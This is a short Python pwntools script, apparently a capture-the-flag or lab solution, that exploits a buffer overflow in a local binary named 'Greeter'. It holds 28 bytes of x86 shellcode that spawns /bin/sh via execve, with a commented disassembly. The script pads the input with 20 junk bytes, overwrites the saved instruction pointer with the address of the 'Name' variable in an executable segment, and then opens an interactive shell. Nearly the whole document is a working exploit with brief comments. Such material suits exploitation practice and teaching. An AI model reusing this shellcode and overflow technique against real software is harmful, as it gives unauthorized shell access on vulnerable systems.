#!/usr/bin/python
from pwn import *

'''
08048060 <_start>:
        8048060: 31 c0                 xor    eax, eax          eax <- 0
        8048062: 50                    push   eax               push 0
        8048063: 68 2f 2f 73 68        push   0x68732f2f        push "//sh"     
        8048068: 68 2f 62 69 6e        push   0x6e69622f        push "/bin"
        804806d: 89 e3                 mov    ebx, esp          ebx <- esp
        804806f: 89 c1                 mov    ecx, eax          ecx <- 0
        8048071: 89 c2                 mov    edx, eax          edx <- 0
        8048073: b0 0b                 mov    al, 0xb           eax <- 11
        8048075: cd 80                 int    0x80              syscall (execve("/bin/sh", 0, 0))
        8048077: 31 c0                 xor    eax, eax          eax <- 0
        8048079: 40                    inc    eax               eax <- 1
        804807a: cd 80                 int    0x80              syscall (exit())
'''

# load file to access variables
e = ELF("Greeter")

payload = b'\x31\xc0\x50\x68\x2f\x2f\x73'
payload += b'\x68\x68\x2f\x62\x69\x6e\x89'
payload += b'\xe3\x89\xc1\x89\xc2\xb0\x0b'
payload += b'\xcd\x80\x31\xc0\x40\xcd\x80'

# junk between payload and EIP
junk = b'A' * 20

# get the address of the "Name" variable that sits in executable segment
eip = p32(e.symbols['Name'])

print(f"Got 'Name's' address: {hex(unpack(eip))}")

# construct exploit
exploit = payload + junk + eip

# start a process to send exploit
p = process("./Greeter")

# send exploit and switch to interactive shell
p.sendline(exploit)
p.interactive()
